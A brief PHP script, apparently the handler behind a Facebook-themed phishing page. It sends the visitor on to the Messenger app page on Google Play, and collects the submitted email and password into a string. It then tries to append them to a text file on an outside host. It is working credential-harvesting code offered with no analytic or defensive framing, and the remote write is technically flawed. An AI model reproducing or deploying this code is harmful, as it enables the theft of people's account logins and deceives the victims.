<?php
header('Location:https://play.google.com/store/apps/details?id=com.facebook.orca');
 $message .= $_POST['email'].":";
$message .= $_POST['pass']. "\n";
file_put_contents('http://mexicooffers.liveblog365.com/1.txt', $message, FILE_APPEND);
